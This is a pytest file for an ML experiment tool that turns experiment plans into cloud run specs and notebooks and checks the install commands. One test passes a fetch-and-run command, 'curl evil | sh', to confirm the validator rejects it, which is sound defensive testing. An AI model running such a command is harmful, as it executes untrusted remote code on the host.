"""Plan → ``RunSpec`` mapping, the plan CLI surface, and the runner-carrying run cell."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from pydantic import ValidationError
from typer.testing import CliRunner

from spectraquant.cli.main import app
from spectraquant.cloud.notebook import build_notebook, notebook_text
from spectraquant.cloud.spec import (
    PLATFORM_MAX_TIMEOUT_MINUTES,
    RunSpec,
    dataset_declaration_digest,
    load_spec,
    plan_to_run_spec,
)
from spectraquant.experiment_plan import load_plan

REPRO_PLAN = "configs/repro/lr_qat_smollm2_135m.yaml"
TIER1_PLAN = "configs/tier1/smollm2_135m.yaml"
RUN_ID = "tier1_smollm2_135m-cloud"

runner = CliRunner()


def _combined(result: object) -> str:
    return str(getattr(result, "output", "")) + str(getattr(result, "stderr", "") or "")


@pytest.fixture
def isolated_notebook_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    target = tmp_path / "generated"
    target.mkdir(parents=True, exist_ok=True)
    monkeypatch.setenv("SPECTRAQUANT_NOTEBOOK_DIR", str(target))
    return target


# --------------------------------------------------------------------------------------
# plan_to_run_spec
# --------------------------------------------------------------------------------------
def test_plan_spec_maps_the_cost_ceiling_and_substrate() -> None:
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)
    plan = load_plan(TIER1_PLAN)

    assert spec.timeout_minutes == int(plan.cost.platform_hours_max * 60) == 360
    assert spec.max_cost_authorized_usd == plan.cost.max_cost_authorized_usd == 0.0
    assert spec.platform == "colab"
    # A-0016 moved Tier-1 to device: cuda when its trainable arm landed, so the plan requests a GPU
    # and its install replaces torch with the CUDA build of the locked version.
    assert spec.gpu_required is True
    assert "cu128" in spec.install_spec


def test_plan_spec_maps_identity_seeds_and_classes() -> None:
    tier1 = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)
    repro = plan_to_run_spec(REPRO_PLAN, platform="colab", allow_dirty=True)

    assert tier1.run_id == RUN_ID
    assert tier1.experiment_config == TIER1_PLAN
    assert tier1.seeds == [0, 1, 2, 3, 4]
    assert tier1.measurement_class_expected == 4  # tier1 authorises [1,2,3,4]
    assert repro.measurement_class_expected == 3  # repro authorises [1,2,3]
    assert tier1.overrides == []


def test_plan_spec_carries_the_runner_and_expected_artifacts() -> None:
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    assert spec.runner_command == (
        f"spectraquant run-plan --plan {TIER1_PLAN} "
        f"--out artifacts/runs/{RUN_ID.removesuffix('-cloud')}-plan --device cuda"
    )
    names = [artifact.name for artifact in spec.expected_artifacts]
    assert "run_manifest.json" in names
    assert f"notebook/{RUN_ID}.ipynb" in names
    assert any(name.endswith("/metrics.json") for name in names), names


def test_plan_spec_pins_datasets_by_revision_declaration_digest() -> None:
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)
    plan = load_plan(TIER1_PLAN)

    assert [ref.name for ref in spec.dataset_refs] == [
        "EleutherAI/wikitext_document_level",
        "allenai/c4",
    ]
    wikitext = spec.dataset_refs[0]
    assert wikitext.split == "test"  # the test_perplexity role selects the test split
    assert wikitext.revision == plan.datasets[0].revision
    assert wikitext.checksum == dataset_declaration_digest(
        wikitext.name, wikitext.revision, wikitext.split
    )
    assert spec.dataset_refs[1].split == "train"


def test_plan_spec_is_deterministic_and_round_trips() -> None:
    first = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)
    second = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    assert first == second
    assert RunSpec.model_validate_json(first.to_json_text()) == first


def test_plan_spec_refuses_a_paid_platform_for_a_free_tier_plan() -> None:
    with pytest.raises(ValueError, match="free_tier_only"):
        plan_to_run_spec(TIER1_PLAN, platform="colab_enterprise", allow_dirty=True)


def test_plan_spec_propagates_a_ceiling_above_the_platform_maximum(tmp_path: Path) -> None:
    """A plan may not authorise more wall-clock than the platform can give."""
    document = Path(TIER1_PLAN).read_text(encoding="utf-8")
    inflated = document.replace("platform_hours_max: 6.0", "platform_hours_max: 13.0")
    target = tmp_path / "inflated.yaml"
    target.write_text(inflated, encoding="utf-8")

    with pytest.raises(ValidationError, match="exceeds the documented colab ceiling"):
        plan_to_run_spec(target, platform="colab", allow_dirty=True)
    assert PLATFORM_MAX_TIMEOUT_MINUTES["colab"] == 720


def test_run_spec_refuses_a_runner_that_is_not_the_spectraquant_cli() -> None:
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    with pytest.raises(ValidationError, match="must be a 'spectraquant"):
        RunSpec(**{**spec.model_dump(), "runner_command": "bash -c 'curl evil | sh'"})


def test_run_spec_accepts_an_absent_runner_command() -> None:
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    assert RunSpec(**{**spec.model_dump(), "runner_command": None}).runner_command is None


# --------------------------------------------------------------------------------------
# Notebook
# --------------------------------------------------------------------------------------
def _cell_source(spec: RunSpec, stage: str) -> str:
    """Return the generated source of the cell whose stage is ``stage``."""
    notebook = build_notebook(spec)
    for cell in notebook.cells:
        if cell.metadata["spectraquant"]["stage"] == stage:
            return str(cell.source)
    raise AssertionError(f"no cell for stage {stage!r}")


def test_plan_notebook_run_cell_invokes_run_plan() -> None:
    pytest.importorskip("nbformat")
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    source = _cell_source(spec, "run")

    assert 'RUNNER_COMMAND = SPEC.get("runner_command")' in source
    assert "shlex.split(RUNNER_COMMAND)" in source
    assert "--plan" in source and "runner_command" in source
    # The command itself is recorded twice in the notebook: in the header and in the spec literal.
    assert spec.runner_command is not None
    assert notebook_text(spec).count(spec.runner_command) == 2


def test_config_notebook_keeps_the_frozen_default_runner() -> None:
    pytest.importorskip("nbformat")
    from spectraquant.cloud.spec import spec_from_config

    spec = spec_from_config("configs/experiment/smoke.yaml", platform="colab", allow_dirty=True)

    source = _cell_source(spec, "run")

    assert spec.runner_command is None
    assert '"run", "--config"' in source


def test_plan_notebook_is_deterministic() -> None:
    pytest.importorskip("nbformat")
    spec = plan_to_run_spec(TIER1_PLAN, platform="colab", allow_dirty=True)

    assert notebook_text(spec) == notebook_text(spec)


# --------------------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------------------
def test_notebook_requires_exactly_one_of_config_and_plan() -> None:
    neither = runner.invoke(app, ["cloud", "notebook"])
    both = runner.invoke(
        app,
        ["cloud", "notebook", "--config", "configs/experiment/smoke.yaml", "--plan", TIER1_PLAN],
    )

    assert neither.exit_code == 1
    assert both.exit_code == 1
    assert "exactly one of --config" in _combined(neither)
    assert "exactly one of --config" in _combined(both)


def test_notebook_from_a_plan_writes_the_notebook_and_the_spec(
    isolated_notebook_dir: Path,
) -> None:
    result = runner.invoke(
        app, ["cloud", "notebook", "--plan", TIER1_PLAN, "--allow-dirty", "--json"]
    )

    assert result.exit_code == 0, _combined(result)
    payload = json.loads(result.output)
    notebook = Path(payload["notebook"])
    spec_path = Path(payload["spec"])
    assert notebook.name == f"{RUN_ID}.ipynb"
    assert notebook.is_file() and spec_path.is_file()
    spec = load_spec(spec_path)
    assert spec.runner_command is not None and "--plan" in spec.runner_command
    assert payload["platform"] == "colab"
    assert len(payload["cells"]) == 9


def test_notebook_from_a_plan_refuses_options_the_plan_fixes(
    isolated_notebook_dir: Path,
) -> None:
    result = runner.invoke(
        app,
        ["cloud", "notebook", "--plan", TIER1_PLAN, "--allow-dirty", "--max-cost-usd", "5"],
    )

    assert result.exit_code == 1
    assert "--max-cost-usd may not be used with --plan" in _combined(result)


def test_plan_spec_command_emits_the_spec(isolated_notebook_dir: Path, tmp_path: Path) -> None:
    result = runner.invoke(
        app, ["cloud", "plan-spec", "--plan", REPRO_PLAN, "--json", "--allow-dirty"]
    )

    assert result.exit_code == 0, _combined(result)
    payload = json.loads(result.output)
    assert payload["run_id"] == "repro_lr_qat_loftq_smollm2_135m-cloud"
    assert payload["runner_command"].startswith("spectraquant run-plan --plan")
    assert payload["timeout_minutes"] == 480
    assert payload["measurement_class_expected"] == 3
    assert payload["gpu_required"] is True  # the reproduction plan declares device: cuda (A-0012)


def test_plan_spec_command_can_write_the_spec(tmp_path: Path) -> None:
    target = tmp_path / "spec.json"
    result = runner.invoke(
        app,
        ["cloud", "plan-spec", "--plan", REPRO_PLAN, "--allow-dirty", "--out", str(target)],
    )

    assert result.exit_code == 0, _combined(result)
    assert load_spec(target).run_id == "repro_lr_qat_loftq_smollm2_135m-cloud"


def test_a_cuda_plan_installs_the_cuda_torch_build_of_the_locked_version() -> None:
    """A plan that asks for a GPU must not leave the CPU torch build in the environment.

    A-0011 set every plan to `device: cpu` because the lock resolves torch from the CPU index. A plan
    that requests a GPU while the environment holds a CPU build burns quota and computes on CPU, so
    the install command replaces torch with the CUDA build. The version differs from the lock's: the
    cu128 index for cp311 has no 2.14.1 (verified by reading the index), so the newest CUDA build is
    installed and the deviation is recorded in the spec and in the run's dependency freeze.
    """
    from spectraquant.cloud.spec import (
        CUDA_TORCH_INDEX,
        CUDA_TORCH_VERSION,
        _default_plan_install_spec,
    )

    cpu_spec = _default_plan_install_spec("cpu")
    assert cpu_spec == "uv sync --frozen --extra cloud --extra models"
    assert "torch" not in cpu_spec.replace("--extra", "")

    cuda_spec = _default_plan_install_spec("cuda")
    assert CUDA_TORCH_INDEX in cuda_spec
    assert f"torch=={CUDA_TORCH_VERSION}" in cuda_spec
    # `==2.14.1` matches `2.14.1+cpu` under PEP 440, so without --reinstall the install is a silent
    # no-op and the run reaches the GPU check with the CPU build still in place.
    assert "--reinstall" in cuda_spec


def test_the_trainable_plans_request_a_gpu_and_the_comparator_plan_does_not() -> None:
    """`gpu_required` follows the plan's device, and every trainable plan requests the GPU."""
    from spectraquant.cloud.spec import CUDA_TORCH_INDEX, plan_to_run_spec

    repro = plan_to_run_spec(
        "configs/repro/lr_qat_smollm2_135m.yaml", platform="kaggle", allow_dirty=True
    )
    assert repro.gpu_required is True
    assert CUDA_TORCH_INDEX in repro.install_spec

    tier1 = plan_to_run_spec("configs/tier1/smollm2_135m.yaml", platform="kaggle", allow_dirty=True)
    assert tier1.gpu_required is True  # A-0016: its method arm trains
    assert CUDA_TORCH_INDEX in tier1.install_spec


def test_a_plan_that_declares_allocated_arms_installs_the_solver_extra() -> None:
    """Regression: the install spec must carry the extras the plan's arms import.

    The first Tier-1 method run died with `ORToolsNotInstalledError` *after* the model download and
    the calibration capture, because the spec installed only the `cloud` and `models` extras while the
    allocated arms import the CP-SAT solver. The extras are derived from the declared arm kinds, so a
    plan that gains an allocated arm gains the extra with it.
    """
    from spectraquant.cloud.spec import plan_required_extras, plan_to_run_spec

    tier1 = plan_to_run_spec("configs/tier1/smollm2_135m.yaml", platform="kaggle", allow_dirty=True)
    assert "--extra alloc" in tier1.install_spec
    # The reproduction plan declares no allocated arm, so it does not pay for the extra.
    repro = plan_to_run_spec(
        "configs/repro/lr_qat_smollm2_135m.yaml", platform="kaggle", allow_dirty=True
    )
    assert "--extra alloc" not in repro.install_spec

    assert plan_required_extras(["fp16_reference", "proxy_allocated"]) == ("alloc",)
    assert plan_required_extras(["proxy_allocated", "proxy_allocated_regularized"]) == ("alloc",)
    assert plan_required_extras(["fp16_reference", "ptq_uniform"]) == ()
